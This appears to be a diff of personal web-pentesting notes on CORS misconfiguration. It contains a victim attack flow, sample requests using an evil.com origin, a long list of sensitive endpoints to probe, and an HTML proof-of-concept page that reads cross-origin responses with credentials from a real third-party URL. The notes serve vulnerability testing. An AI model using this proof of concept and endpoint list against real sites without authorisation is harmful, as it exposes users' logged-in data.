@@ -1,25 +1,172 @@
-CORS is a controlled relaxation of SOP that allows cross-origin access explicitly.
-
-How it works: Uses HTTP response headers sent by the server.
-
-Important Headers
-Access-Control-Allow-Origin
-Access-Control-Allow-Methods
-Access-Control-Allow-Headers
-Access-Control-Allow-Credentials
-
-Example: 
-        Access-Control-Allow-Origin: https://trusted.com
+CORS stands for Cross-Origin Resource Sharing. It’s a security feature used by web browsers to control how resources (like APIs, images, or scripts) are shared between different websites (origins).
 
 
-➡️ Allows trusted.com to access the resource.
-Common Misconfiguration
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
-
-❌ High-risk misconfiguration
+1. Victim logs into siteA.com
+   ↓
+2. Browser stores siteA.com cookies
+   ↓
+3. Victim visits evil.com
+   ↓
+4. evil.com JavaScript sends request TO siteA.com
+   ↓
+5. Browser automatically includes siteA.com cookies
+   because request destination is siteA.com
 
 
 
-Security Impact: Data leakage
-                Account takeover (in some cases)
+#Malicous Rule
+Access-Control-Allow-Origin: * = Any website/domain is allowed to access this resource
+Access-Control-Allow-Credentials: true = Browser is allowed to send credentials with the request
+
+#Rule Checking Tool
+https://pentesthint.com/vapt-tools/cors-misconfiguration-detector
+
+
+
+#Request:
+GET /about HTTP/2
+Host: http://some.com
+Origin: http://evil.com
+Response:
+HTTP/2 200
+Access-Control-Allow-Origin: http://evil.com
+
+
+* In Response Like this that means vulnerbale: Access-Control-Allow-Origin: evil.com
+                                               Access-Control-Allow-Credentials: true
+
+
+
+#We need to check at sensitive endpoints
+
+# User / Profile
+GET /api/user
+GET /api/users
+GET /api/profile
+GET /profile
+GET /me
+GET /account
+GET /account/details
+GET /account/settings
+GET /user
+GET /user/profile
+GET /user/settings
+GET /api/account
+GET /api/account/details
+GET /api/me
+GET /settings
+
+# Dashboard
+GET /dashboard
+GET /api/dashboard
+GET /dashboard/data
+GET /api/stats
+GET /api/overview
+GET /analytics
+GET /api/analytics
+
+# Authentication
+POST /login
+POST /signup
+POST /register
+POST /auth/login
+POST /auth/signup
+GET /logout
+GET /session
+GET /api/session
+GET /api/auth/user
+GET /auth/me
+GET /whoami
+
+# Orders / Billing / Payments
+GET /api/orders
+GET /orders
+GET /api/billing
+GET /billing
+GET /api/payment-methods
+GET /payments
+GET /transactions
+GET /api/transactions
+GET /api/invoices
+
+# Admin
+GET /admin
+GET /admin/dashboard
+GET /api/admin
+GET /api/admin/users
+GET /api/admin/logs
+GET /api/admin/settings
+GET /management
+
+# GraphQL / API Versions
+POST /graphql
+POST /api/graphql
+GET /v1/user
+GET /v1/account
+GET /v2/user
+GET /v2/account
+GET /rest/user
+
+# Common Sensitive APIs
+GET /api/data
+GET /api/private
+GET /api/internal
+GET /api/config
+GET /api/preferences
+GET /notifications
+GET /messages
+GET /api/messages
+GET /documents
+GET /files
+GET /api/files
+
+# Cloud / Mobile APIs
+GET /mobile/api/user
+GET /app/api/profile
+GET /client/api/me
+
+# Developer / Debug
+GET /debug
+GET /api/debug
+GET /logs
+GET /api/logs
+GET /status
+GET /health
+
+
+
+#save it html file , and load , if the data is showed vulnerble
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>CORS POC Exploit</title>
+</head>
+
+<body>
+    <center>
+        <h2>CORS POC Exploit</h2>
+        <button onclick="exploitCORS()">Fetch from the target!</button>
+        <hr size="1" width="80%">
+        <textarea id="fetchedResource" rows="10" cols="50" style="width: 75%" placeholder="19"></textarea>
+    </center>
+
+    <script>
+        function exploitCORS() {
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('GET', 'https://a.bildstatic.de/lazy-chunk-DsMFmuko.js', true);
+            req.withCredentials = true;
+            req.send();
+        }
+
+        function reqListener() {
+            document.getElementById("fetchedResource").value = this.responseText;
+        }
+    </script>
+</body>
+
+</html>
+
+
